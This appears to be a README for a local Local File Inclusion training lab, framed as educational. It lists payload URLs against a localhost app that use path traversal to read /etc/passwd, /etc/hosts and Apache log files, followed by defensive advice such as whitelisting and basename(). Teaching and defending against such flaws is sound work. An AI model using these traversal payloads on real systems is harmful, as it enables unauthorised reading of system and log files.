# Simple LFI Lab

## Overview
This lab demonstrates a basic Local File Inclusion (LFI) vulnerability for educational purposes.

## Vulnerability
The application includes files via the `page` parameter without proper validation:
```
http://localhost:8081/?page=home
```

## Basic LFI Exploitation

### 1. Include existing pages
```
http://localhost:8081/?page=about
http://localhost:8081/?page=services
http://localhost:8081/?page=contact
```

### 2. Path traversal to read system files
```
http://localhost:8081/?page=../../../../etc/passwd
http://localhost:8081/?page=../../../../etc/hosts
```

### 3. Include log files (if accessible)
```
http://localhost:8081/?page=../../../../var/log/apache2/access.log
http://localhost:8081/?page=../../../../var/log/apache2/error.log
```

## Available Pages
- `home.php` - Main landing page
- `about.php` - About us page
- `services.php` - Services page
- `contact.php` - Contact page

## Defense Strategies
- Validate user input against a whitelist of allowed pages
- Use basename() to prevent path traversal
- Implement proper access controls
- Never include files based on unvalidated user input
- Use a router/controller pattern instead of direct file inclusion

## Educational Purpose
This lab is designed for authorized security testing and education only.